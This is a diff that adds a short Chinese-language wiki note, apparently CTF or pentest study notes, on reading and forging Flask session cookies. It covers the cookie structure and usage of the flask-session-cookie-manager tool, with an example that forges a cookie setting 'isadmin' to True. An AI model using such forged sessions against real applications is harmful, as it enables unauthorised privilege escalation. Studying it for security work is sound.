@@ -1,0 +1,41 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-25T09:18:50+08:00
+
+====== session伪造 ======
+Created 星期一 25 十一月 2024
+
+需要拿到原始secret_key才能伪造
+
+session读取：
+https://www.mrskye.cn/archives/56c89add/
+flask的session是在客户端，原理是对内容加签名，所以只防篡改，不防读取。
+$python flask_session_cookie_manager3.py decode [-s <secrete_key>] -c <cookie_value>
+
+session伪造：
+python flask_session_cookie_manager3.py encode -s <secrete_key> -t <cookie_value>
+-t 参数必须是python语句，且外层必须用双引号括起来
+
+session结构：
+base64(json数据).timestamp.signature
+或
+.base64(zip(json数据)).timestamp.signature
+具体流程：
+1. json.dumps 将对象转换成json字符串，作为数据
+2. 如果数据压缩后长度更短，则用zlib库进行压缩
+3. 将数据用base64编码
+4. 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割
+
+工具：
+https://github.com/noraj/flask-session-cookie-manager
+依赖：itsdangerous, flask
+usage: 
+python flask_session_cookie_manager3.py decode [-s <secrete_key>] -c <cookie_value>
+	e.g. $ python3 flask_session_cookie_manager3.py decode -c eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw
+
+python flask_session_cookie_manager3.py encode -s <secrete_key> -t <cookie_value>
+-t 参数必须是python语句，且外层必须用双引号括起来
+-s必须正确才能通过flask的验证
+	e.g. $ python3 flask_session_cookie_manager3.py encode -s "abc -t "{'current_wifi':'0315c4de4da2aaf37b66f56fca07cb16.jpg','isadmin':True}"
+
+"{'current_wifi':'f06982bf64e5f267f866553e6f9425b0.jpg', 'isadmin':True}"
